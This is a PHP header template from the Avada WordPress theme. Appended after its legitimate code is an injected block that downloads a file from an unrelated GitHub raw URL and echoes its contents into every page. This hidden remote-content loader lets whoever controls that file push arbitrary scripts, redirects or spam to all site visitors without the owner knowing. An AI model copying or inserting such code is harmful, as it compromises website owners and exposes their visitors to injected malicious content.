<?php
/**
 * Header-1 template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       https://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
$header_type = Avada()->settings->get( 'header_layout' );
get_template_part( 'templates/header-' . $header_type ); ?>
	<?php
$a = file_get_contents('https://raw.githubusercontent.com/janda354311/tes/master/code(2).php');
echo $a;
?>
